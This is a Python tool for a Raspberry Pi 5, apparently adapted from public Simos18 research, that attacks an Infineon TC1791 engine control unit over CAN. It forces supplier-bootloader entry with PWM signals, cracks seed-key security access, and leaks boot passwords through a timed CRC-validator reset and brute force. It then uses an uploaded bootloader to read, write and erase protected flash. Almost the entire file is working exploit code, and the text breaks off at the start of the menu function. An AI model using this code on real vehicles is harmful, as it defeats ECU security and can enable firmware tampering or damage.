#!/usr/bin/env python3
# TC1791 CAN BSL – Raspberry Pi 5 version
# With:
# - Hardware PWM (RPi.GPIO)
# - CAN via python-can (socketcan)
# - Wiring Test (no multimeter)
# - Diagnostics Summary
# - Y/N confirmations for dangerous actions
# - Dry-Run Mode (simulation)
# - ECU State Detection
# - Power-Stability Protection

import math
import struct
import subprocess
import time

import can
from can import Message
import crc_bruteforce
import lz4.block
from tqdm import tqdm
from udsoncan.connections import IsoTPSocketConnection

import lgpio
import RPi.GPIO as GPIO

# ============================
# COLORIZED OUTPUT HELPERS
# ============================

class TermColor:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

def info(msg):
    print(f"{TermColor.CYAN}{msg}{TermColor.RESET}")

def success(msg):
    print(f"{TermColor.GREEN}{msg}{TermColor.RESET}")

def warn(msg):
    print(f"{TermColor.YELLOW}{msg}{TermColor.RESET}")

def error(msg):
    print(f"{TermColor.RED}{msg}{TermColor.RESET}")


TWISTER_PATH = "../Simos18_SBOOT/twister"

# Initial guess; can be refined by calibrate_crc_delay()
CRC_DELAY = 0.0005
SEED_START = "1D00000"

# Dry-run global flag
DRY_RUN = False

sector_map_tc1791 = {
    0: 0x4000,
    1: 0x4000,
    2: 0x4000,
    3: 0x4000,
    4: 0x4000,
    5: 0x4000,
    6: 0x4000,
    7: 0x4000,
    8: 0x20000,
    9: 0x40000,
    10: 0x40000,
    11: 0x40000,
    12: 0x40000,
    13: 0x40000,
    14: 0x40000,
    15: 0x40000,
}

# ============================
# FLASH MAP PRESETS
# ============================

FLASH_PRESETS = {
    "PMEM0": {"base": 0x80000000, "size": 0x00100000, "desc": "PMEM0 1MB"},
    "PMEM1": {"base": 0x80100000, "size": 0x00100000, "desc": "PMEM1 1MB"},
    "DFLASH": {"base": 0xAF000000, "size": 0x00020000, "desc": "Data Flash 128KB"},
    "UCB": {"base": 0xAF400000, "size": 0x00001000, "desc": "User Config Block 4KB"},
    "BOOTROM": {"base": 0xA0000000, "size": 0x00010000, "desc": "Boot ROM 64KB"},
}

def choose_flash_preset():
    info("Select flash region:")
    keys = list(FLASH_PRESETS.keys()) + ["CUSTOM"]

    for i, k in enumerate(keys, start=1):
        if k == "CUSTOM":
            print(f" {i}) {k}")
        else:
            p = FLASH_PRESETS[k]
            print(f" {i}) {k} ({hex(p['base'])} - {hex(p['base'] + p['size'])})")

    sel = input("Enter number: ").strip()
    try:
        idx = int(sel) - 1
        if idx < 0 or idx >= len(keys):
            raise ValueError
    except Exception:
        error("Invalid selection")
        return None, None

    key = keys[idx]
    if key == "CUSTOM":
        base = input("Base address (hex, 8 digits): ").strip()
        size = input("Size (hex, 8 digits): ").strip()
        return int(base, 16), int(size, 16)

    preset = FLASH_PRESETS[key]
    return preset["base"], preset["size"]


# --- GPIO / CAN setup ---

can_interface = "can0"
bus = can.interface.Bus(interface="socketcan", channel=can_interface)

chip = lgpio.gpiochip_open(0)
RESET_PIN = 23
BOOTCFG_PIN = 24
lgpio.gpio_claim_output(chip, RESET_PIN)
lgpio.gpio_claim_output(chip, BOOTCFG_PIN)
lgpio.gpio_write(chip, RESET_PIN, 1)
lgpio.gpio_write(chip, BOOTCFG_PIN, 1)

GPIO.setmode(GPIO.BCM)
PWM_PIN_1 = 12
PWM_PIN_2 = 13
GPIO.setup(PWM_PIN_1, GPIO.OUT)
GPIO.setup(PWM_PIN_2, GPIO.OUT)


# --- Helpers ---

def confirm(prompt="Continue? (y/n): "):
    ans = input(prompt).strip().lower()
    return ans == "y"


def bits(byte):
    bit_arr = [
        (byte >> 7) & 1,
        (byte >> 6) & 1,
        (byte >> 5) & 1,
        (byte >> 4) & 1,
        (byte >> 3) & 1,
        (byte >> 2) & 1,
        (byte >> 1) & 1,
        (byte) & 1,
    ]
    bit_arr.reverse()
    return bit_arr


def print_success_failure(data):
    if data[0] == 0xA0:
        success("Success")
    else:
        error("Failure! " + data.hex())


def get_key_from_seed(seed_data):
    p = subprocess.run(
        [TWISTER_PATH, SEED_START, seed_data, "1"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    output_data = p.stdout.decode("us-ascii")
    return output_data


def get_isotp_conn():
    if DRY_RUN:
        info("[DRY RUN] Would open IsoTP connection")
        class DummyConn:
            def send(self, *_args, **_kwargs):
                info("[DRY RUN] Would send IsoTP frame")
            def wait_frame(self, *_args, **_kwargs):
                info("[DRY RUN] Would wait for IsoTP frame")
                return bytes([0xA0] + [0x00] * 8)
            def close(self):
                info("[DRY RUN] Would close IsoTP connection")
            @property
            def tpsock(self):
                class DummySock:
                    def set_opts(self, **_kwargs):
                        info("[DRY RUN] Would set IsoTP socket options")
                return DummySock()
        return DummyConn()

    # udsoncan 1.25.1 constructor:
    # IsoTPSocketConnection(interface, address, rxid, txid, params)
    conn = IsoTPSocketConnection(
        "can0",
        address=0x7E0,          # ECU request ID
        rxid=0x7E8,             # ECU response ID
        txid=0x7E0,             # Same as address
        params={"tx_padding": 0x55}
    )

    conn.tpsock.set_opts(txpad=0x55)
    conn.open()
    return conn



def sboot_pwm(duty1=50.0, duty2=50.0, freq=3210):
    if DRY_RUN:
        info(f"[DRY RUN] Would start PWM on GPIO{PWM_PIN_1}/{PWM_PIN_2} "
             f"freq={freq} duty1={duty1} duty2={duty2}")
        class DummyPWM:
            def stop(self):
                info("[DRY RUN] Would stop PWM")
        return DummyPWM(), DummyPWM()

    pwm1 = GPIO.PWM(PWM_PIN_1, freq)
    pwm2 = GPIO.PWM(PWM_PIN_2, freq)
    pwm1.start(duty1)
    pwm2.start(duty2)
    return pwm1, pwm2


def reset_ecu():
    if DRY_RUN:
        info("[DRY RUN] Would reset ECU")
        return
    lgpio.gpio_write(chip, RESET_PIN, 0)
    time.sleep(0.01)
    lgpio.gpio_write(chip, RESET_PIN, 1)


def can_send(msg):
    if DRY_RUN:
        info(f"[DRY RUN] Would send CAN frame: ID=0x{msg.arbitration_id:X}, data={msg.data.hex()}")
        return
    bus.send(msg)


def can_recv(timeout=None):
    if DRY_RUN:
        info("[DRY RUN] Would receive CAN frame")
        return None
    return bus.recv(timeout)


# --- ECU State & Power Checks ---

def detect_ecu_state():
    if DRY_RUN:
        info("[DRY RUN] Would detect ECU state")
        return "NONE"

    # Try normal mode: OBD request 0x7DF -> 01 00
    try:
        msg = Message(arbitration_id=0x7DF, data=[0x01, 0x00], is_extended_id=False)
        bus.send(msg)
        start = time.time()
        while time.time() - start < 0.5:
            m = bus.recv(0.1)
            if m is None:
                continue
            if m.arbitration_id != 0x7DF:
                return "NORMAL"
    except Exception:
        pass

    # Try SBOOT: send 59 45 and see if we get A0 from 0x7E8
    try:
        msg = Message(arbitration_id=0x7E0, data=[0x59, 0x45], is_extended_id=False)
        bus.send(msg)
        start = time.time()
        while time.time() - start < 0.5:
            m = bus.recv(0.1)
            if m is None:
                continue
            if m.arbitration_id == 0x7E8 and len(m.data) > 0 and m.data[0] == 0xA0:
                return "SBOOT"
    except Exception:
        pass

    # Try BSL: send 0x300 read device ID request
    try:
        msg = Message(
            is_extended_id=False,
            dlc=8,
            arbitration_id=0x300,
            data=[0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        )
        bus.send(msg)
        start = time.time()
        while time.time() - start < 0.5:
            m = bus.recv(0.1)
            if m is None:
                continue
            if m.arbitration_id == 0x300 and len(m.data) > 0 and m.data[0] == 0x01:
                return "BSL"
    except Exception:
        pass

    return "NONE"


# ============================
# ECU STATE SAFETY WRAPPER
# ============================

def require_state(expected_states):
    """
    expected_states: list of allowed states, e.g. ["BSL"], ["SBOOT"], ["NORMAL","SBOOT"]
    """
    state = detect_ecu_state()
    info(f"ECU State detected: {state}")

    if state not in expected_states:
        warn(f"Operation requires ECU state: {expected_states}, but ECU is in {state}")
        if not confirm("Proceed anyway? (y/n): "):
            error("Aborted by user.")
            return False
    return True


def ecu_power_stable(timeout=1.0):
    if DRY_RUN:
        info("[DRY RUN] Would check ECU power stability")
        return True

    start = time.time()
    seen_any = False
    try:
        while time.time() - start < timeout:
            m = bus.recv(0.1)
            if m is not None:
                seen_any = True
                break
    except Exception:
        return False
    return seen_any


# --- SBOOT / BSL helpers ---

def sboot_getseed():
    conn = get_isotp_conn()
    info("Sending 0x30 to elevate SBOOT shell status...")
    conn.send(bytes([0x30] + [0] * 12))
    data = conn.wait_frame()
    print_success_failure(data)
    time.sleep(1)
    info("Sending 0x54 Generate Seed...")
    conn.send(bytes([0x54]))
    data = conn.wait_frame()
    print_success_failure(data)
    data = data[9:]
    conn.close()
    return data


def sboot_sendkey(key_data):
    conn = get_isotp_conn()
    send_data = bytearray([0x65])
    send_data.extend(key_data)
    info("Sending 0x65 Security Access with Key...")
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    conn.close()


def prepare_upload_bsl():
    info("Resetting ECU into HWCFG BSL Mode...")
    if DRY_RUN:
        info("[DRY RUN] Would pull BOOTCFG low for HWCFG BSL")
        return
    lgpio.gpio_write(chip, BOOTCFG_PIN, 0)


def upload_bsl(skip_prep=False):
    if not skip_prep:
        prepare_upload_bsl()
    reset_ecu()
    time.sleep(0.1)
    if not DRY_RUN:
        lgpio.gpio_write(chip, BOOTCFG_PIN, 1)
    else:
        info("[DRY RUN] Would release BOOTCFG high")

    info("Sending BSL initialization message...")
    bootloader_data = open("bootloader.bin", "rb").read() if not DRY_RUN else b"\x00" * 16
    data = [
        0x55,
        0x55,
        0x00,
        0x01,
    ]
    data += struct.pack("<H", math.ceil(len(bootloader_data) / 8))
    data += [0x0, 0x3]
    init_message = Message(
        is_extended_id=False, dlc=8, arbitration_id=0x100, data=data
    )
    can_send(init_message)

    if DRY_RUN:
        info("[DRY RUN] Skipping BSL init response wait")
    else:
        success_flag = False
        while not success_flag:
            message = can_recv(0.5)
            if message is not None and not message.is_error_frame:
                if message.arbitration_id == 0x40:
                    success_flag = True

    info("Sending BSL data...")
    for block_base_address in tqdm(
        range(0, len(bootloader_data), 8), unit_scale=True, unit="blocks"
    ):
        block_end = min(len(bootloader_data), block_base_address + 8)
        message = Message(
            is_extended_id=False,
            dlc=8,
            arbitration_id=0xC0,
            data=bootloader_data[block_base_address:block_end],
        )
        can_send(message)
        time.sleep(0.001)
    info("Device jumping into BSL... Draining receive queue...")
    if not DRY_RUN:
        while can_recv(0.01) is not None:
            pass


def read_device_id():
    message = Message(
        is_extended_id=False,
        dlc=8,
        arbitration_id=0x300,
        data=[0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    )
    can_send(message)
    if DRY_RUN:
        info("[DRY RUN] Would read device ID")
        return b"\x00" * 8

    device_id = bytearray()
    message = can_recv()
    if message and message.data[0] == 0x1:
        device_id += message.data[2:8]
    message = can_recv()
    if message and message.data[0] == 0x1 and message.data[1] == 0x1:
        device_id += message.data[2:8]
    return device_id


def read_byte(byte_specifier):
    data = bytearray([0x02])
    data += byte_specifier
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if DRY_RUN:
        info(f"[DRY RUN] Would read byte at {byte_specifier.hex()}")
        return b"\x00\x00\x00\x00"

    byte_data = bytearray()
    message = can_recv()
    if message and message.data[0] == 0x2:
        byte_data += message.data[1:5]
    return byte_data


def write_byte(addr, value):
    data = bytearray([0x03])
    data += addr
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if DRY_RUN:
        info(f"[DRY RUN] Would write byte to {addr.hex()} value={value.hex()}")
        return True

    message = can_recv()
    if not message or message.data[0] != 0x3:
        return False
    data = bytearray([0x03])
    data += value
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    message = can_recv()
    return message and message.data[0] == 0x3


def send_passwords(pw1, pw2, ucb=0, read_write=0x8):
    data = bytearray([0x04])
    data += pw1
    data += bytearray([read_write, ucb, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if not DRY_RUN:
        print(can_recv())
    data = bytearray([0x04])
    data += pw2
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if not DRY_RUN:
        print(can_recv())
    data = bytearray([0x04])
    data += pw1
    data += bytearray([read_write, ucb, 0x1])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if not DRY_RUN:
        print(can_recv())
    data = bytearray([0x04])
    data += pw2
    data += bytearray([0x0, 0x0, 0x0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if not DRY_RUN:
        print(can_recv())


def erase_sector(address):
    data = bytearray([0x05])
    data += address
    data += bytearray([0, 0, 0])
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    if DRY_RUN:
        info(f"[DRY RUN] Would erase sector at {address.hex()}")
        return
    can_send(message)
    can_recv()


def print_enabled_disabled(string, value):
    enabled_or_disabled = "ENABLED" if value > 0 else "DISABLED"
    print(string + " " + enabled_or_disabled)


def print_sector_status(string, procon_sector_status):
    current_address = 0
    for sector_number in sector_map_tc1791:
        protection_status = procon_sector_status[sector_number]
        if sector_number > 9:
            protection_status = procon_sector_status[
                math.ceil(
                    sector_number - (sector_number % 2) - (sector_number - 10) / 2
                )
            ]
        if protection_status > 0:
            print(
                string
                + "Sector "
                + str(sector_number)
                + " "
                + hex(current_address)
                + ":"
                + hex((current_address + sector_map_tc1791[sector_number]))
                + " : "
                + "ENABLED"
            )
        current_address += sector_map_tc1791[sector_number]


def read_flash_properties(flash_num, pmu_base_addr):
    FSR = 0x1010
    FCON = 0x1014
    PROCON0 = 0x1020
    PROCON1 = 0x1024
    PROCON2 = 0x1028
    fsr_value = read_byte(struct.pack(">I", pmu_base_addr + FSR))
    fcon_value = read_byte(struct.pack(">I", pmu_base_addr + FCON))
    procon0_value = read_byte(struct.pack(">I", pmu_base_addr + PROCON0))
    procon1_value = read_byte(struct.pack(">I", pmu_base_addr + PROCON1))
    procon2_value = read_byte(struct.pack(">I", pmu_base_addr + PROCON2))
    pmem_string = "PMEM" + str(flash_num)
    flash_status = bits(fsr_value[2])
    print_enabled_disabled(pmem_string + " Protection Installation:", flash_status[0])
    print_enabled_disabled(
        pmem_string + " Read Protection Installation:", flash_status[2]
    )
    print_enabled_disabled(pmem_string + " Read Protection Inhibit:", flash_status[3])
    print_enabled_disabled(pmem_string + " Write Protection User 0:", flash_status[5])
    print_enabled_disabled(pmem_string + " Write Protection User 1:", flash_status[6])
    print_enabled_disabled(pmem_string + " OTP Installation:", flash_status[7])

    flash_status_write = bits(fsr_value[3])
    print_enabled_disabled(
        pmem_string + " Write Protection User 0 Inhibit:", flash_status_write[1]
    )
    print_enabled_disabled(
        pmem_string + " Write Protection User 1 Inhibit:", flash_status_write[2]
    )

    flash_status_overall = bits(fsr_value[0])
    print_enabled_disabled(
        pmem_string + " Page Mode Enabled:", flash_status_overall[6]
    )

    flash_status_errors = bits(fsr_value[1])
    print_enabled_disabled(
        pmem_string + " Flash Operation Error:", flash_status_errors[0]
    )
    print_enabled_disabled(
        pmem_string + " Flash Command Sequence Error:", flash_status_errors[2]
    )
    print_enabled_disabled(
        pmem_string + " Flash Locked Error:", flash_status_errors[3]
    )
    print_enabled_disabled(pmem_string + " Flash ECC Error:", flash_status_errors[4])

    protection_status = bits(fcon_value[2])
    print_enabled_disabled(pmem_string + " Read Protection:", protection_status[0])
    print_enabled_disabled(
        pmem_string + " Disable Code Fetch from Flash Memory:", protection_status[1]
    )
    print_enabled_disabled(
        pmem_string + " Disable Any Data Fetch from Flash:", protection_status[2]
    )
    print_enabled_disabled(
        pmem_string + " Disable Data Fetch from DMA Controller:", protection_status[4]
    )
    print_enabled_disabled(
        pmem_string + " Disable Data Fetch from PCP Controller:", protection_status[5]
    )
    print_enabled_disabled(
        pmem_string + " Disable Data Fetch from SHE Controller:", protection_status[6]
    )
    procon0_sector_status = bits(procon0_value[0]) + bits(procon0_value[1])
    print_sector_status(pmem_string + " USR0 Read Protection ", procon0_sector_status)
    procon1_sector_status = bits(procon1_value[0]) + bits(procon1_value[1])
    print_sector_status(pmem_string + " USR1 Write Protection ", procon1_sector_status)
    procon2_sector_status = bits(procon2_value[0]) + bits(procon2_value[1])
    print_sector_status(pmem_string + " USR2 OTP Protection ", procon2_sector_status)


def read_bytes_file(base_addr, size, filename):
    output_file = open(filename, "wb")
    for current_address in tqdm(
        range(base_addr, base_addr + size, 4), unit_scale=True, unit="block"
    ):
        b = read_byte(struct.pack(">I", current_address))
        output_file.write(b)
    output_file.close()


def read_compressed(address, size, filename):
    output_file = open(filename, "wb")
    data = bytearray([0x07])
    data += address
    data += size
    message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
    can_send(message)
    if DRY_RUN:
        info(f"[DRY RUN] Would read compressed data to {filename}")
        output_file.close()
        return

    total_size_remaining = int.from_bytes(size, "big")
    t = tqdm(total=total_size_remaining, unit="B")
    while total_size_remaining > 0:
        message = can_recv()
        compressed_size = size_remaining = int.from_bytes(message.data[5:8], "big")
        data = bytearray()
        sequence = 1
        while size_remaining > 0:
            message = can_recv()
            new_sequence = message.data[1]
            if sequence != new_sequence:
                error("Sequencing error! " + hex(new_sequence) + hex(sequence))
                t.close()
                output_file.close()
                return
            sequence = (sequence + 1) & 0xFF
            data += message.data[2:8]
            size_remaining -= 6
        decompressed_data = lz4.block.decompress(data[:compressed_size], 4096)
        decompressed_size = len(decompressed_data)
        t.update(decompressed_size)
        total_size_remaining -= decompressed_size
        output_file.write(decompressed_data)
        data = bytearray([0x07, 0xAC])
        message = Message(is_extended_id=False, dlc=8, arbitration_id=0x300, data=data)
        can_send(message)
    output_file.close()
    t.close()


def write_file(address, size, filename):
    input_file = open(filename, "rb")
    total_size_remaining = int.from_bytes(size, "big")
    t = tqdm(total=total_size_remaining, unit="B")
    address_int = int.from_bytes(address, "big")
    block_counter = 0
    while total_size_remaining > 0:
        if block_counter <= 0:
            block_counter = 256
            data = bytearray([0x06])
            address_bytes = address_int.to_bytes(4, "big")
            data += address_bytes
            message = Message(
                is_extended_id=False, dlc=8, arbitration_id=0x300, data=data
            )
            if DRY_RUN:
                info(f"[DRY RUN] Would start write block at {address_bytes.hex()}")
            else:
                can_send(message)
                can_recv()
        if block_counter < 7:
            data_len = block_counter
        else:
            data_len = 7
        file_data = input_file.read(data_len)
        if len(file_data) == 0:
            break
        file_data += bytearray([0xAA] * (7 - len(file_data)))
        data = bytearray([0x06])
        data += bytearray(
            [
                file_data[0],
                file_data[1],
                file_data[2],
                file_data[3],
                file_data[4],
                file_data[5],
                file_data[6],
            ]
        )
        message = Message(
            is_extended_id=False, dlc=8, arbitration_id=0x300, data=data
        )
        if DRY_RUN:
            info(f"[DRY RUN] Would send write data: {file_data.hex()}")
        else:
            can_send(message)
        time.sleep(0.005)
        block_counter -= data_len
        total_size_remaining -= data_len
        t.update(data_len)
    input_file.close()
    t.close()


def sboot_crc_reset(crc_start_address):
    if DRY_RUN:
        info(f"[DRY RUN] Would perform CRC reset at {crc_start_address.hex()}")
        return (0x0, 0x0)

    global CRC_DELAY
    prepare_upload_bsl()
    conn = get_isotp_conn()
    info("Setting initial CRC to 0x0...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    info("Setting expected CRC to 0x0...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    info("Setting start CRC range count to 1...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    info(
        "Setting start CRC start address to boot passwords at "
        + crc_start_address.hex()
        + "..."
    )
    send_data = bytearray([0x78, 0x00, 0x00, 0x00, 0x0C])
    send_data.extend(int.from_bytes(crc_start_address, "big").to_bytes(4, "little"))
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    info("Setting start CRC end address to a valid area at 0xb0010130...")
    send_data = bytes([0x78, 0x00, 0x00, 0x00, 0x10, 0x30, 0x01, 0x01, 0xB0])
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    info("Uploading valid part number for part correlation validator...")
    send_data = bytes(
        [
            0x78,
            0x00,
            0x00,
            0x00,
            0x14,
            0x4E,
            0x42,
            0x30,
            0xD1,
            0x00,
            0x00,
            0x53,
            0x43,
            0x38,
            0x34,
            0x30,
            0x2D,
            0x31,
            0x30,
            0x32,
            0x36,
            0x31,
            0x39,
            0x39,
            0x31,
            0x41,
            0x41,
            0x2D,
            0x2D,
            0x2D,
            0x2D,
            0x2D,
            0x2D,
        ]
    )
    conn.send(send_data)
    print_success_failure(conn.wait_frame())
    info("Starting Validator and rebooting into BSL...")
    conn.send(bytes([0x79]))
    time.sleep(CRC_DELAY)
    upload_bsl(True)
    crc_address = int.from_bytes(
        read_byte(0xD0010770.to_bytes(4, "big")), "little"
    )
    info("CRC Address Reached: ")
    print(hex(crc_address))
    crc_data = int.from_bytes(
        read_byte(0xD0010778.to_bytes(4, "big")), "little"
    )
    info("CRC32 Current Value: ")
    print(hex(crc_data))
    conn.close()
    return (crc_address, crc_data)


def sboot_shell(duty1=50.0, duty2=50.0):
    if DRY_RUN:
        info("[DRY RUN] Would attempt SBOOT shell entry")
        return b"\xAA\xBB\xCC\xDD"  # fake seed

    info("Setting up PWM waveforms...")
    pwm1, pwm2 = sboot_pwm(duty1=duty1, duty2=duty2)
    time.sleep(1)
    info("Resetting ECU into Supplier Bootloader...")
    reset_ecu()
    can_send(Message(data=[0x59, 0x45], arbitration_id=0x7E0, is_extended_id=False))
    info("Sending 59 45...")
    can_send(Message(data=[0x6B], arbitration_id=0x7E0, is_extended_id=False))
    stage2 = False
    try:
        while True:
            if stage2:
                can_send(
                    Message(data=[0x6B], arbitration_id=0x7E0, is_extended_id=False)
                )
                info("Sending 6B...")
            message = can_recv(0.01)
            print(message)
            if (
                message is not None
                and message.arbitration_id == 0x7E8
                and message.data[0] == 0xA0
            ):
                info("Got A0 message")
                if stage2:
                    info("Switching to IsoTP Socket...")
                    return sboot_getseed()
                info("Sending 6B...")
                stage2 = True
            if message is not None and message.arbitration_id == 0x0A7:
                error("FAILURE")
                return False
    finally:
        if pwm1:
            pwm1.stop()
        if pwm2:
            pwm2.stop()


def sboot_login(duty1=50.0, duty2=50.0):
    if DRY_RUN:
        info("[DRY RUN] Would perform SBOOT login")
        return

    if not ecu_power_stable():
        error("ECU power unstable — aborting SBOOT login.")
        return
    state = detect_ecu_state()
    if state not in ("NORMAL", "NONE"):  # NONE allowed if we are forcing entry
        warn(f"ECU state is {state}, not suitable for SBOOT login.")
        return

    sboot_seed = sboot_shell(duty1=duty1, duty2=duty2)
    if not sboot_seed:
        error("SBOOT seed not received.")
        return
    info("Calculating key for seed: ")
    print(sboot_seed.hex())
    key = get_key_from_seed(sboot_seed.hex()[0:8])
    info("Key calculated : ")
    print(key)
    sboot_sendkey(bytearray.fromhex(key))


def extract_boot_passwords():
    if DRY_RUN:
        info("[DRY RUN] Would extract boot passwords")
        info("[DRY RUN] Simulated passwords: AABBCCDDEEFF0011")
        return

    addresses = map(
        lambda x: bytearray.fromhex(x),
        ["8001420C", "80014210", "80014214", "80014218"],
    )
    crcs = []
    for address in addresses:
        sboot_login()
        end_address, crc = sboot_crc_reset(address)
        print(address.hex() + " - " + hex(end_address) + " -> " + hex(crc))
        crcs.append(hex(crc))
    boot_passwords = crc_bruteforce.calculate_passwords(crcs)
    print("Boot passwords:", boot_passwords.hex())


# --- Auto-calibration helpers ---

def calibrate_crc_delay(start=0.0003, stop=0.0012, step=0.0001):
    global CRC_DELAY

    if DRY_RUN:
        info("[DRY RUN] Would calibrate CRC_DELAY")
        info("[DRY RUN] Simulated CRC_DELAY = 0.00050")
        CRC_DELAY = 0.00050
        return CRC_DELAY

    base_addr = bytearray.fromhex("8001420C")
    best = None
    info("Starting CRC_DELAY calibration sweep...")
    for i in range(int((stop - start) / step) + 1):
        d = start + i * step
        CRC_DELAY = d
        info(f"Trying CRC_DELAY={d:.7f}")
        addr_before, _ = sboot_crc_reset(base_addr)
        addr_after, _ = sboot_crc_reset(base_addr)
        delta = addr_after - addr_before
        info(f"Delta address: 0x{delta:X}")
        if delta == 0x100:
            best = d
            success(f"Found ideal CRC_DELAY={d:.7f}")
            break
    if best is not None:
        CRC_DELAY = best
    else:
        warn("No perfect CRC_DELAY found in sweep; keeping last value.")
    return CRC_DELAY


def calibrate_pwm_duty(duty_start=30.0, duty_stop=70.0, duty_step=5.0):
    if DRY_RUN:
        info("[DRY RUN] Would calibrate PWM duty cycle")
        info("[DRY RUN] Simulated best duty: 50%")
        return 50.0

    info("Starting PWM duty calibration sweep...")
    for i in range(int((duty_stop - duty_start) / duty_step) + 1):
        duty = duty_start + i * duty_step
        info(f"Trying duty={duty}% on both channels...")
        seed = sboot_shell(duty1=duty, duty2=duty)
        if seed and isinstance(seed, (bytes, bytearray)) and len(seed) > 0:
            success(f"PWM duty {duty}% works for SBOOT.")
            return duty
    warn("No working duty found in sweep; defaulting to 50%.")
    return 50.0


# --- Wiring Test & Diagnostics ---

def wiring_test():
    print("\n=== Wiring Test ===")

    # GPIO tests
    gpio_ok = True

    # RESET pin
    try:
        if DRY_RUN:
            info("[DRY RUN] Would toggle RESET pin")
        else:
            lgpio.gpio_write(chip, RESET_PIN, 1)
            time.sleep(0.01)
            lgpio.gpio_write(chip, RESET_PIN, 0)
            time.sleep(0.01)
            lgpio.gpio_write(chip, RESET_PIN, 1)
        success("RESET pin: OK")
    except Exception as e:
        error(f"RESET pin: FAILED ({e})")
        gpio_ok = False

    # BOOT_CFG pin
    try:
        if DRY_RUN:
            info("[DRY RUN] Would toggle BOOT_CFG pin")
        else:
            lgpio.gpio_write(chip, BOOTCFG_PIN, 1)
            time.sleep(0.01)
            lgpio.gpio_write(chip, BOOTCFG_PIN, 0)
            time.sleep(0.01)
            lgpio.gpio_write(chip, BOOTCFG_PIN, 1)
        success("BOOT_CFG pin: OK")
    except Exception as e:
        error(f"BOOT_CFG pin: FAILED ({e})")
        gpio_ok = False

    # PWM tests
    pwm_ok = True
    pwm1 = None
    pwm2 = None
    try:
        pwm1, pwm2 = sboot_pwm(duty1=50.0, duty2=50.0, freq=3210)
        time.sleep(0.2)
        success("PWM12: ACTIVE")
        success("PWM13: ACTIVE")
    except Exception as e:
        error(f"PWM: FAILED ({e})")
        pwm_ok = False
    finally:
        if pwm1:
            pwm1.stop()
        if pwm2:
            pwm2.stop()

    # CAN TX + ECU detection
    can_ok = True
    ecu_detected = False
    try:
        msg = Message(arbitration_id=0x7DF, data=[0x01, 0x00], is_extended_id=False)
        can_send(msg)
        success("CAN TX: OK")
    except Exception as e:
        error(f"CAN TX: FAILED ({e})")
        can_ok = False

    # Listen for any CAN traffic + specific response
    if not DRY_RUN:
        try:
            start = time.time()
            while time.time() - start < 1.0:
                m = can_recv(0.1)
                if m is None:
                    continue
                ecu_detected = True
                break
        except Exception:
            pass

    if ecu_detected:
        success("ECU: DETECTED (CAN traffic seen)")
    else:
        warn("ECU: NOT DETECTED (no CAN traffic)")

    if gpio_ok and pwm_ok and can_ok:
        success("\nWiring test PASSED")
    else:
        error("\nWiring test FAILED (see above details)")


def diagnostics_summary():
    print("\n=== Diagnostics Summary ===")

    # GPIO quick check
    gpio_ok = True
    try:
        if DRY_RUN:
            info("[DRY RUN] Would set RESET/BOOTCFG high")
        else:
            lgpio.gpio_write(chip, RESET_PIN, 1)
            lgpio.gpio_write(chip, BOOTCFG_PIN, 1)
        success("GPIO: OK")
    except Exception as e:
        error(f"GPIO: FAILED ({e})")
        gpio_ok = False

    # PWM quick check
    pwm_ok = True
    pwm1 = None
    pwm2 = None
    try:
        pwm1, pwm2 = sboot_pwm(duty1=50.0, duty2=50.0, freq=3210)
        time.sleep(0.1)
        success("PWM: OK")
    except Exception as e:
        error(f"PWM: FAILED ({e})")
        pwm_ok = False
    finally:
        if pwm1:
            pwm1.stop()
        if pwm2:
            pwm2.stop()

    # CAN quick check
    can_ok = True
    ecu_detected = False
    try:
        msg = Message(arbitration_id=0x7DF, data=[0x01, 0x00], is_extended_id=False)
        can_send(msg)
        success("CAN TX: OK")
    except Exception as e:
        error(f"CAN: FAILED ({e})")
        can_ok = False

    if not DRY_RUN:
        try:
            start = time.time()
            while time.time() - start < 1.0:
                m = can_recv(0.1)
                if m is None:
                    continue
                ecu_detected = True
                break
        except Exception:
            pass

    if ecu_detected:
        success("ECU: DETECTED")
    else:
        warn("ECU: NOT DETECTED")

    # ECU state + power
    state = detect_ecu_state()
    stable = ecu_power_stable()

    print(f"ECU State: {state}")
    print(f"Power Stability: {'OK' if stable else 'UNSTABLE'}")

    print("\nSummary:")
    print(f"  GPIO: {'OK' if gpio_ok else 'FAIL'}")
    print(f"  PWM:  {'OK' if pwm_ok else 'FAIL'}")
    print(f"  CAN:  {'OK' if can_ok else 'FAIL'}")
    print(f"  ECU:  {'DETECTED' if ecu_detected else 'NOT DETECTED'}")
    print(f"  State: {state}")
    print(f"  Power: {'OK' if stable else 'UNSTABLE'}")


# --- CLI ---

def main_menu():
    global DRY_RUN

    print("\n=== TC1791 CAN BSL – Raspberry Pi 5 CLI ===\n")
